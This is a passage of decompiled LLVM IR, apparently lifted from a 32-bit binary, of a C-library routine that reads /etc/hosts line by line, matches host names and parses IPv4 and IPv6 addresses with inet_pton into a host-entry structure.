  %v7_80583c4 = icmp ult i32 %v1_80583c1, %v1_80583ba
  %v1_80583c6 = add i32 %v0_80583b7, 36
  store i32 %v1_80583c6, i32* @edi, align 4
  br i1 %v7_80583c4, label %dec_label_pc_80583d0, label %dec_label_pc_80583cb

dec_label_pc_80583cb:                             ; preds = %dec_label_pc_80583b7
  %v1_80583cb = add i32 %v0_80583b7, 44
  store i32 %v1_80583cb, i32* @esi, align 4
  br label %dec_label_pc_80583d5

dec_label_pc_80583d0:                             ; preds = %dec_label_pc_80583b7
  %v1_80583d0 = add i32 %v0_80583b7, 56
  store i32 %v1_80583d0, i32* @esi, align 4
  store i32 %v1_80583c1, i32* @ebp, align 4
  br label %dec_label_pc_80583d5

dec_label_pc_80583d5:                             ; preds = %dec_label_pc_80583cb, %dec_label_pc_80583d0
  %v0_80583d5 = phi i32 [ %v1_80583ba, %dec_label_pc_80583cb ], [ %v1_80583c1, %dec_label_pc_80583d0 ]
  %tmp148 = icmp ult i32 %v0_80583d5, 80
  br i1 %tmp148, label %dec_label_pc_8058609, label %dec_label_pc_80583de

dec_label_pc_80583de:                             ; preds = %dec_label_pc_80583d5
  %v0_80583de = call i32 @__open_etc_hosts()
  store i32 %v0_80583de, i32* %eax.global-to-local, align 4
  %v1_80583e3 = icmp eq i32 %v0_80583de, 0
  br i1 %v1_80583e3, label %dec_label_pc_805840b, label %dec_label_pc_80583eb

dec_label_pc_80583eb:                             ; preds = %dec_label_pc_80583de
  store i32 %v1_8058373, i32* %edx.global-to-local, align 4
  store i32 %v1_80583b7, i32* %eax.global-to-local, align 4
  %v0_80583f3 = load i32, i32* @edi, align 4
  %v0_80583f7 = load i32, i32* @esi, align 4
  %v4_80583fb = inttoptr i32 %v1_8058373 to i8*
  br label %dec_label_pc_80584b9

dec_label_pc_805840b:                             ; preds = %dec_label_pc_80583de
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805840f = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805840f, align 4
  %v1_8058415 = call i32 @__errno_location(i32 0)
  store i32 %v1_8058415, i32* %eax.global-to-local, align 4
  %v1_805841a = inttoptr i32 %v1_8058415 to i32*
  %v2_805841a = load i32, i32* %v1_805841a, align 4
  store i32 %v2_805841a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058609

dec_label_pc_8058425:                             ; preds = %dec_label_pc_805858c
  %v2_8058425 = load i8*, i8** %stack_var_-44, align 4
  %v3_8058425 = ptrtoint i8* %v2_8058425 to i32
  store i32 %v3_8058425, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_805842c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8058425, i32* %v2_805842c, align 4
  %v0_805842e = load i32, i32* %eax.global-to-local, align 4
  %v1_805842e = add i32 %v0_805842e, 4
  %v2_805842e = inttoptr i32 %v1_805842e to i32*
  store i32 0, i32* %v2_805842e, align 4
  %v0_8058435 = load i32, i32* @ebx, align 4
  %v1_8058435 = add i32 %v0_8058435, 4
  %v2_8058435 = inttoptr i32 %v1_8058435 to i32*
  %v3_8058435 = load i32, i32* %v2_8058435, align 4
  store i32 %v3_8058435, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8058435, i32* %arg5, align 4
  %v1_805843e = add i32 %tmp60, 8
  %v2_805843e = inttoptr i32 %v1_805843e to i32*
  store i32 2, i32* %v2_805843e, align 4
  %v0_8058445 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058445 = add i32 %v0_8058445, 12
  %v2_8058445 = inttoptr i32 %v1_8058445 to i32*
  store i32 4, i32* %v2_8058445, align 4
  br label %dec_label_pc_805847e

dec_label_pc_8058452:                             ; preds = %dec_label_pc_80585ae
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_805845a = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805845a, align 4
  %v0_805845c = load i32, i32* %edx.global-to-local, align 4
  %v1_805845c = add i32 %v0_805845c, 4
  %v2_805845c = inttoptr i32 %v1_805845c to i32*
  store i32 0, i32* %v2_805845c, align 4
  %v0_8058463 = load i32, i32* @ebx, align 4
  %v1_8058463 = add i32 %v0_8058463, 4
  %v2_8058463 = inttoptr i32 %v1_8058463 to i32*
  %v3_8058463 = load i32, i32* %v2_8058463, align 4
  store i32 %v3_8058463, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8058463, i32* %arg5, align 4
  %v1_805846c = add i32 %tmp60, 8
  %v2_805846c = inttoptr i32 %v1_805846c to i32*
  store i32 10, i32* %v2_805846c, align 4
  %v0_8058473 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058473 = add i32 %v0_8058473, 12
  %v2_8058473 = inttoptr i32 %v1_8058473 to i32*
  store i32 16, i32* %v2_8058473, align 4
  br label %dec_label_pc_805847e

dec_label_pc_805847e:                             ; preds = %dec_label_pc_8058425, %dec_label_pc_8058452
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8058425 ], [ %storemerge3, %dec_label_pc_8058452 ]
  %v1_805847e = load i32, i32* %edx.global-to-local, align 4
  %v2_805847e = add i32 %v1_805847e, 16
  %v3_805847e = inttoptr i32 %v2_805847e to i32*
  store i32 %storemerge, i32* %v3_805847e, align 4
  %v0_8058481 = load i32, i32* @ebx, align 4
  %v1_8058481 = add i32 %v0_8058481, 8
  %v1_8058484 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058484 = add i32 %v1_8058484, 4
  %v3_8058484 = inttoptr i32 %v2_8058484 to i32*
  store i32 %v1_8058481, i32* %v3_8058484, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_805848b = load i32, i32* %edx.global-to-local, align 4
  %v2_805848b = inttoptr i32 %arg8 to i32*
  store i32 %v0_805848b, i32* %v2_805848b, align 4
  br label %dec_label_pc_80585e9

dec_label_pc_80584b9:                             ; preds = %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge, %dec_label_pc_80583eb
  %v1_80584bd.pre-phi = phi i32* [ %.pre, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v1_805838a, %dec_label_pc_80583eb ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v4_80583fb, %dec_label_pc_80583eb ]
  %stack_var_-20.0.in = phi i32 [ %v1_8058373, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v0_80583f7, %dec_label_pc_80583eb ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v1_8058373, %dec_label_pc_80583eb ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v0_80583f3, %dec_label_pc_80583eb ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v0_80583de, %dec_label_pc_80583eb ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_805836e.dec_label_pc_80584b9_crit_edge ], [ %v1_80583b7, %dec_label_pc_80583eb ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80584bd.pre-phi, align 4
  %v12_8058547 = icmp eq i32 %arg4, 2
  %v4_8058572 = inttoptr i32 %arg2 to i8*
  %v12_8058585 = icmp eq i32 %arg3, 2
  %v12_80585a7 = icmp eq i32 %arg3, 10
  %v1_8058551 = icmp eq i1 %v12_8058547, false
  %v1_805858a = icmp eq i1 %v12_8058585, false
  %v1_80585ac = icmp eq i1 %v12_80585a7, false
  br label %dec_label_pc_80585cf.outer

dec_label_pc_80585cf.outer:                       ; preds = %dec_label_pc_80585a7, %dec_label_pc_80585ae, %dec_label_pc_805858c, %dec_label_pc_80584b9
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_80584b9 ], [ 2, %dec_label_pc_805858c ], [ 2, %dec_label_pc_80585ae ], [ 2, %dec_label_pc_80585a7 ]
  br label %dec_label_pc_80585cf

dec_label_pc_80584d0:                             ; preds = %dec_label_pc_80585cf
  %v3_80584d8 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_80584d8, i32* @eax, align 4
  %v1_80584e0 = icmp eq i32 %v3_80584d8, 0
  br i1 %v1_80584e0, label %dec_label_pc_80584e7, label %dec_label_pc_80584e4

dec_label_pc_80584e4:                             ; preds = %dec_label_pc_80584d0
  %v1_80584e4 = inttoptr i32 %v3_80584d8 to i8*
  store i8 0, i8* %v1_80584e4, align 1
  br label %dec_label_pc_80584e7

dec_label_pc_80584e7:                             ; preds = %dec_label_pc_80584d0, %dec_label_pc_80584e4
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805852734 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805852735 = icmp eq i8 %v2_805852734, 0
  %v1_805852a41 = icmp eq i1 %v3_805852735, false
  br i1 %v1_805852a41, label %dec_label_pc_80584f3.preheader.preheader, label %dec_label_pc_805852c

dec_label_pc_80584f3.preheader.preheader:         ; preds = %dec_label_pc_80584e7
  %v4_80584f398.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80584f3.preheader

dec_label_pc_80584ef:                             ; preds = %dec_label_pc_80584f9
  store i8 0, i8* %v1_80584f3104, align 1
  %v0_80584f2 = load i32, i32* @ecx, align 4
  %v1_80584f2 = add i32 %v0_80584f2, 1
  store i32 %v1_80584f2, i32* @ecx, align 4
  %v1_80584f3 = inttoptr i32 %v1_80584f2 to i8*
  %v2_80584f3 = load i8, i8* %v1_80584f3, align 1
  %v3_80584f3 = zext i8 %v2_80584f3 to i32
  %v4_80584f3 = load i32, i32* %eax.global-to-local, align 4
  %v5_80584f3 = and i32 %v4_80584f3, -256
  %v6_80584f3 = or i32 %v5_80584f3, %v3_80584f3
  store i32 %v6_80584f3, i32* @eax, align 4
  %v4_80584f5 = icmp eq i8 %v2_80584f3, 0
  br i1 %v4_80584f5, label %dec_label_pc_80584f3.dec_label_pc_805852c.loopexit_crit_edge, label %dec_label_pc_80584f9

dec_label_pc_80584f9:                             ; preds = %dec_label_pc_80584f3.preheader, %dec_label_pc_80584ef
  %v2_80584f3105 = phi i8 [ %v2_80584f3, %dec_label_pc_80584ef ], [ %v2_80584f396, %dec_label_pc_80584f3.preheader ]
  %v1_80584f3104 = phi i8* [ %v1_80584f3, %dec_label_pc_80584ef ], [ %v1_80584f395, %dec_label_pc_80584f3.preheader ]
  %v0_80584ef103 = phi i32 [ %v1_80584f2, %dec_label_pc_80584ef ], [ %v0_80584f349, %dec_label_pc_80584f3.preheader ]
  %v2_80584f9 = sext i8 %v2_80584f3105 to i32
  store i32 %v2_80584f9, i32* @edx, align 4
  %v0_80584fc = load i32, i32* @global_var_805f23c, align 4
  store i32 %v0_80584fc, i32* %eax.global-to-local, align 4
  %v2_8058501 = mul nsw i32 %v2_80584f9, 2
  %v3_8058501 = add i32 %v0_80584fc, %v2_8058501
  %v4_8058501 = inttoptr i32 %v3_8058501 to i8*
  %v5_8058501 = load i8, i8* %v4_8058501, align 1
  %v6_8058501 = and i8 %v5_8058501, 32
  %v7_8058501 = icmp eq i8 %v6_8058501, 0
  %v1_8058505 = icmp eq i1 %v7_8058501, false
  br i1 %v1_8058505, label %dec_label_pc_80584ef, label %dec_label_pc_8058507

dec_label_pc_8058507:                             ; preds = %dec_label_pc_80584f9
  %v0_8058507 = load i32, i32* @edi, align 4
  %v1_8058507 = add i32 %v0_8058507, -6
  %v6_8058507 = sub i32 5, %v0_8058507
  %v7_8058507 = and i32 %v6_8058507, %v0_8058507
  %v8_8058507 = icmp slt i32 %v7_8058507, 0
  %v9_8058507 = icmp eq i32 %v1_8058507, 0
  %v10_8058507 = icmp slt i32 %v1_8058507, 0
  %v3_805850a = icmp eq i1 %v10_8058507, %v8_8058507
  %v4_805850a = icmp eq i1 %v9_8058507, false
  %v5_805850a = and i1 %v4_805850a, %v3_805850a
  br i1 %v5_805850a, label %dec_label_pc_8058513.preheader, label %dec_label_pc_805850c

dec_label_pc_805850c:                             ; preds = %dec_label_pc_8058507
  %v1_805850c = load i32, i32* @ebx, align 4
  %v3_805850c = mul i32 %v0_8058507, 4
  %v4_805850c = add i32 %v1_805850c, %v3_805850c
  %v5_805850c = inttoptr i32 %v4_805850c to i32*
  store i32 %v0_80584ef103, i32* %v5_805850c, align 4
  %v0_805850f = load i32, i32* @edi, align 4
  %v1_805850f = add i32 %v0_805850f, 1
  store i32 %v1_805850f, i32* @edi, align 4
  %v0_8058513.pre.pre = load i32, i32* @ecx, align 4
  %v4_8058513.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058513.preheader

dec_label_pc_8058513.preheader:                   ; preds = %dec_label_pc_805850c, %dec_label_pc_8058507
  %v4_8058513.pre = phi i32 [ %v4_8058513.pre.pre, %dec_label_pc_805850c ], [ %v0_80584fc, %dec_label_pc_8058507 ]
  %v0_8058513.pre = phi i32 [ %v0_8058513.pre.pre, %dec_label_pc_805850c ], [ %v0_80584ef103, %dec_label_pc_8058507 ]
  %v0_805852c54 = phi i32 [ %v1_805850f, %dec_label_pc_805850c ], [ %v0_8058507, %dec_label_pc_8058507 ]
  %v1_8058513106 = inttoptr i32 %v0_8058513.pre to i8*
  %v2_8058513107 = load i8, i8* %v1_8058513106, align 1
  %v3_8058513108 = zext i8 %v2_8058513107 to i32
  %v5_8058513109 = and i32 %v4_8058513.pre, -256
  %v6_8058513110 = or i32 %v3_8058513108, %v5_8058513109
  store i32 %v6_8058513110, i32* @eax, align 4
  %v4_8058515111 = icmp eq i8 %v2_8058513107, 0
  br i1 %v4_8058515111, label %dec_label_pc_8058527.loopexit, label %dec_label_pc_8058519.lr.ph

dec_label_pc_8058519.lr.ph:                       ; preds = %dec_label_pc_8058513.preheader
  %v0_805851c.pre = load i32, i32* @global_var_805f23c, align 4
  br label %dec_label_pc_8058519

dec_label_pc_8058512:                             ; preds = %dec_label_pc_8058519
  %v1_8058512 = add i32 %v0_8058527113, 1
  store i32 %v1_8058512, i32* @ecx, align 4
  %v1_8058513 = inttoptr i32 %v1_8058512 to i8*
  %v2_8058513 = load i8, i8* %v1_8058513, align 1
  %v3_8058513 = zext i8 %v2_8058513 to i32
  %v5_8058513 = and i32 %v0_805851c.pre, -256
  %v6_8058513 = or i32 %v3_8058513, %v5_8058513
  store i32 %v6_8058513, i32* @eax, align 4
  %v4_8058515 = icmp eq i8 %v2_8058513, 0
  br i1 %v4_8058515, label %dec_label_pc_8058527.loopexit, label %dec_label_pc_8058519

dec_label_pc_8058519:                             ; preds = %dec_label_pc_8058519.lr.ph, %dec_label_pc_8058512
  %v2_8058513115 = phi i8 [ %v2_8058513107, %dec_label_pc_8058519.lr.ph ], [ %v2_8058513, %dec_label_pc_8058512 ]
  %v1_8058513114 = phi i8* [ %v1_8058513106, %dec_label_pc_8058519.lr.ph ], [ %v1_8058513, %dec_label_pc_8058512 ]
  %v0_8058527113 = phi i32 [ %v0_8058513.pre, %dec_label_pc_8058519.lr.ph ], [ %v1_8058512, %dec_label_pc_8058512 ]
  %v2_8058519 = sext i8 %v2_8058513115 to i32
  store i32 %v2_8058519, i32* @edx, align 4
  store i32 %v0_805851c.pre, i32* @eax, align 4
  %v2_8058521 = mul nsw i32 %v2_8058519, 2
  %v3_8058521 = add i32 %v0_805851c.pre, %v2_8058521
  %v4_8058521 = inttoptr i32 %v3_8058521 to i8*
  %v5_8058521 = load i8, i8* %v4_8058521, align 1
  %v6_8058521 = and i8 %v5_8058521, 32
  %v7_8058521 = icmp eq i8 %v6_8058521, 0
  br i1 %v7_8058521, label %dec_label_pc_8058512, label %dec_label_pc_8058527.loopexit

dec_label_pc_8058527.loopexit:                    ; preds = %dec_label_pc_8058519, %dec_label_pc_8058512, %dec_label_pc_8058513.preheader
  %v4_80584f398139 = phi i32 [ %v6_8058513110, %dec_label_pc_8058513.preheader ], [ %v6_8058513, %dec_label_pc_8058512 ], [ %v0_805851c.pre, %dec_label_pc_8058519 ]
  %v0_8058527.lcssa = phi i32 [ %v0_8058513.pre, %dec_label_pc_8058513.preheader ], [ %v1_8058512, %dec_label_pc_8058512 ], [ %v0_8058527113, %dec_label_pc_8058519 ]
  %v1_8058513.lcssa = phi i8* [ %v1_8058513106, %dec_label_pc_8058513.preheader ], [ %v1_8058513, %dec_label_pc_8058512 ], [ %v1_8058513114, %dec_label_pc_8058519 ]
  %v2_8058527 = load i8, i8* %v1_8058513.lcssa, align 1
  %v3_8058527 = icmp eq i8 %v2_8058527, 0
  %v1_805852a = icmp eq i1 %v3_8058527, false
  br i1 %v1_805852a, label %dec_label_pc_80584f3.preheader, label %dec_label_pc_805852c

dec_label_pc_80584f3.preheader:                   ; preds = %dec_label_pc_80584f3.preheader.preheader, %dec_label_pc_8058527.loopexit
  %v0_805852c.pre142 = phi i32 [ %v0_805852c54, %dec_label_pc_8058527.loopexit ], [ 0, %dec_label_pc_80584f3.preheader.preheader ]
  %v4_80584f398 = phi i32 [ %v4_80584f398139, %dec_label_pc_8058527.loopexit ], [ %v4_80584f398.pre, %dec_label_pc_80584f3.preheader.preheader ]
  %v0_80584f349 = phi i32 [ %v0_8058527.lcssa, %dec_label_pc_8058527.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_80584f3.preheader.preheader ]
  %v1_80584f395 = inttoptr i32 %v0_80584f349 to i8*
  %v2_80584f396 = load i8, i8* %v1_80584f395, align 1
  %v3_80584f397 = zext i8 %v2_80584f396 to i32
  %v5_80584f399 = and i32 %v4_80584f398, -256
  %v6_80584f3100 = or i32 %v5_80584f399, %v3_80584f397
  store i32 %v6_80584f3100, i32* @eax, align 4
  %v4_80584f5101 = icmp eq i8 %v2_80584f396, 0
  br i1 %v4_80584f5101, label %dec_label_pc_805852c, label %dec_label_pc_80584f9

dec_label_pc_80584f3.dec_label_pc_805852c.loopexit_crit_edge: ; preds = %dec_label_pc_80584ef
  %v0_805852c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805852c

dec_label_pc_805852c:                             ; preds = %dec_label_pc_8058527.loopexit, %dec_label_pc_80584f3.dec_label_pc_805852c.loopexit_crit_edge, %dec_label_pc_80584f3.preheader, %dec_label_pc_80584e7
  %v1_805852f = phi i32 [ 0, %dec_label_pc_80584e7 ], [ %v0_805852c.pre.pre, %dec_label_pc_80584f3.dec_label_pc_805852c.loopexit_crit_edge ], [ %v0_805852c.pre142, %dec_label_pc_80584f3.preheader ], [ %v0_805852c54, %dec_label_pc_8058527.loopexit ]
  %v0_805852f = load i32, i32* @ebx, align 4
  %v2_805852f = mul i32 %v1_805852f, 4
  %v3_805852f = add i32 %v0_805852f, %v2_805852f
  %v4_805852f = inttoptr i32 %v3_805852f to i32*
  store i32 0, i32* %v4_805852f, align 4
  %v7_8058536 = icmp sgt i32 %v1_805852f, 1
  br i1 %v7_8058536, label %dec_label_pc_805853c, label %dec_label_pc_80585cf

dec_label_pc_805853c:                             ; preds = %dec_label_pc_805852c
  br i1 %v12_805836e, label %dec_label_pc_8058609, label %dec_label_pc_8058547

dec_label_pc_8058547:                             ; preds = %dec_label_pc_805853c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8058551, label %dec_label_pc_805857f.preheader, label %dec_label_pc_8058553

dec_label_pc_805857f.preheader:                   ; preds = %dec_label_pc_8058547
  %v1_805857f119 = load i32, i32* @edi, align 4
  %v5_8058581128 = icmp sgt i32 %v1_805857f119, 1
  br i1 %v5_8058581128, label %dec_label_pc_8058569.lr.ph, label %dec_label_pc_80585cf

dec_label_pc_8058569.lr.ph:                       ; preds = %dec_label_pc_805857f.preheader
  %v0_8058569.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8058569

dec_label_pc_8058553:                             ; preds = %dec_label_pc_8058547
  %v0_8058553 = load i32, i32* @eax, align 4
  %v0_8058555 = load i32, i32* @ebx, align 4
  %v1_8058555 = inttoptr i32 %v0_8058555 to i32*
  %v2_8058555 = load i32, i32* %v1_8058555, align 4
  %v5_805855b = call i32 @__GI_strcoll(i8* %v4_8058572, i32 %v2_8058555, i32 %v0_8058553, i32 %v0_8058553)
  store i32 %v5_805855b, i32* %eax.global-to-local, align 4
  %v1_8058563 = icmp eq i32 %v5_805855b, 0
  %v1_8058565 = icmp eq i1 %v1_8058563, false
  br i1 %v1_8058565, label %dec_label_pc_80585cf, label %dec_label_pc_8058585

dec_label_pc_8058569:                             ; preds = %dec_label_pc_8058569.lr.ph, %dec_label_pc_805857e
  %v0_8058569 = phi i32 [ %v0_8058569.pre, %dec_label_pc_8058569.lr.ph ], [ %v5_8058572, %dec_label_pc_805857e ]
  %v1_805856b129 = phi i32 [ 1, %dec_label_pc_8058569.lr.ph ], [ %v1_805857e, %dec_label_pc_805857e ]
  %v0_805856b = load i32, i32* @ebx, align 4
  %v2_805856b = mul i32 %v1_805856b129, 4
  %v3_805856b = add i32 %v0_805856b, %v2_805856b
  %v4_805856b = inttoptr i32 %v3_805856b to i32*
  %v5_805856b = load i32, i32* %v4_805856b, align 4
  %v5_8058572 = call i32 @__GI_strcasecmp(i8* %v4_8058572, i32 %v5_805856b, i32 %v0_8058569, i32 %v0_8058569)
  store i32 %v5_8058572, i32* %eax.global-to-local, align 4
  %v1_805857a = icmp eq i32 %v5_8058572, 0
  br i1 %v1_805857a, label %dec_label_pc_8058585, label %dec_label_pc_805857e

dec_label_pc_805857e:                             ; preds = %dec_label_pc_8058569
  %v0_805857e = load i32, i32* @esi, align 4
  %v1_805857e = add i32 %v0_805857e, 1
  store i32 %v1_805857e, i32* @esi, align 4
  %v1_805857f = load i32, i32* @edi, align 4
  %v5_8058581 = icmp slt i32 %v1_805857e, %v1_805857f
  br i1 %v5_8058581, label %dec_label_pc_8058569, label %dec_label_pc_80585cf

dec_label_pc_8058585:                             ; preds = %dec_label_pc_8058553, %dec_label_pc_8058569
  br i1 %v1_805858a, label %dec_label_pc_80585a7, label %dec_label_pc_805858c

dec_label_pc_805858c:                             ; preds = %dec_label_pc_8058585
  %v0_805858c = load i32, i32* @esi, align 4
  %v3_805858d = load i8*, i8** %stack_var_-44, align 4
  %v4_805858d = ptrtoint i8* %v3_805858d to i32
  %v0_8058591 = load i32, i32* @ebx, align 4
  %v1_8058591 = inttoptr i32 %v0_8058591 to i32*
  %v2_8058591 = load i32, i32* %v1_8058591, align 4
  %v4_8058595 = inttoptr i32 %v2_8058591 to i8*
  %v5_8058595 = call i32 @inet_pton(i32 2, i8* %v4_8058595, i32 %v4_805858d, i32 %v0_805858c)
  store i32 %v5_8058595, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8058595, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8058425, label %dec_label_pc_80585cf.outer

dec_label_pc_80585a7:                             ; preds = %dec_label_pc_8058585
  br i1 %v1_80585ac, label %dec_label_pc_80585cf.outer, label %dec_label_pc_80585ae

dec_label_pc_80585ae:                             ; preds = %dec_label_pc_80585a7
  %v0_80585ae = load i32, i32* @ecx, align 4
  %v0_80585b3 = load i32, i32* @ebx, align 4
  %v1_80585b3 = inttoptr i32 %v0_80585b3 to i32*
  %v2_80585b3 = load i32, i32* %v1_80585b3, align 4
  %v4_80585b7 = inttoptr i32 %v2_80585b3 to i8*
  %v5_80585b7 = call i32 @inet_pton(i32 10, i8* %v4_80585b7, i32 %stack_var_-36.0, i32 %v0_80585ae)
  store i32 %v5_80585b7, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_80585b7, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8058452, label %dec_label_pc_80585cf.outer

dec_label_pc_80585cf:                             ; preds = %dec_label_pc_805857f.preheader, %dec_label_pc_805857e, %dec_label_pc_805852c, %dec_label_pc_8058553, %dec_label_pc_80585cf.outer
  %v0_80585cf = load i32, i32* @edx, align 4
  %v3_80585d9 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_80585cf)
  store i32 %v3_80585d9, i32* @eax, align 4
  %v1_80585e1 = icmp eq i32 %v3_80585d9, 0
  %v1_80585e3 = icmp eq i1 %v1_80585e1, false
  br i1 %v1_80585e3, label %dec_label_pc_80584d0, label %dec_label_pc_80585e9

dec_label_pc_80585e9:                             ; preds = %dec_label_pc_80585cf, %dec_label_pc_805847e
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805847e ], [ %stack_var_-28.0.ph, %dec_label_pc_80585cf ]
  br i1 %v12_805836e, label %dec_label_pc_8058609, label %dec_label_pc_80585f0

dec_label_pc_80585f0:                             ; preds = %dec_label_pc_80585e9
  %v1_80585f7 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80585f7 = call i32 @__GI_fclose(i16* %v1_80585f7)
  store i32 %v2_80585f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058609

dec_label_pc_8058609:                             ; preds = %dec_label_pc_805853c, %dec_label_pc_8058359, %dec_label_pc_8058365, %dec_label_pc_8058383, %dec_label_pc_8058396, %dec_label_pc_80583a2, %dec_label_pc_80583ab, %dec_label_pc_80583d5, %dec_label_pc_80585e9, %dec_label_pc_80585f0, %dec_label_pc_805840b
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80585e9 ], [ %stack_var_-28.1, %dec_label_pc_80585f0 ], [ %v2_805841a, %dec_label_pc_805840b ], [ 34, %dec_label_pc_80583d5 ], [ 34, %dec_label_pc_80583ab ], [ 34, %dec_label_pc_80583a2 ], [ 34, %dec_label_pc_8058396 ], [ 34, %dec_label_pc_8058383 ], [ 34, %dec_label_pc_8058365 ], [ 34, %dec_label_pc_8058359 ], [ %stack_var_-28.0.ph, %dec_label_pc_805853c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8058344, i32* @ebx, align 4
  store i32 %v0_8058343, i32* @esi, align 4
  store i32 %v0_8058342, i32* @edi, align 4
  store i32 %v0_8058341, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_805857e, { 0, 2, 1 }
  uselistorder i32 %v5_8058572, { 1, 2, 0 }
  uselistorder i32 %v0_8058569, { 1, 0 }
  uselistorder i32 %v1_805852f, { 1, 0 }
  uselistorder i8 %v2_80584f396, { 1, 2, 0 }
  uselistorder i8* %v1_80584f395, { 1, 0 }
  uselistorder i32 %v0_80584f349, { 1, 0 }
  uselistorder i32 %v2_8058519, { 1, 0 }
  uselistorder i32 %v1_8058512, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805851c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8058507, { 1, 0 }
  uselistorder i32 %v0_8058507, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80584f9, { 1, 0 }
  uselistorder i8* %v4_8058572, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80583b7, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8058396, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8058373, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_805837a, { 1, 0 }
  uselistorder i32 %v1_8058354, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 5, { 21, 27, 28, 29, 0, 20, 9, 10, 23, 11, 33, 34, 2, 5, 30, 22, 31, 32, 12, 19, 13, 8, 24, 7, 25, 14, 6, 26, 15, 16, 17, 3, 4, 18, 1 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 7, 21, 9, 10, 11, 8, 22, 23, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* @global_var_805f23c, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 35, { 1, 4, 2, 3, 0 }
  uselistorder i32 10, { 28, 0, 38, 39, 40, 41, 42, 43, 1, 12, 29, 2, 8, 44, 9, 10, 11, 30, 3, 14, 35, 36, 13, 45, 31, 4, 26, 27, 15, 16, 32, 25, 24, 23, 22, 21, 20, 18, 19, 7, 37, 5, 33, 34, 17, 6 }
  uselistorder i32 80, { 0, 2, 4, 5, 6, 7, 8, 9, 10, 11, 3, 1 }
  uselistorder i32 56, { 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13, 14, 3, 2, 15, 16, 0 }
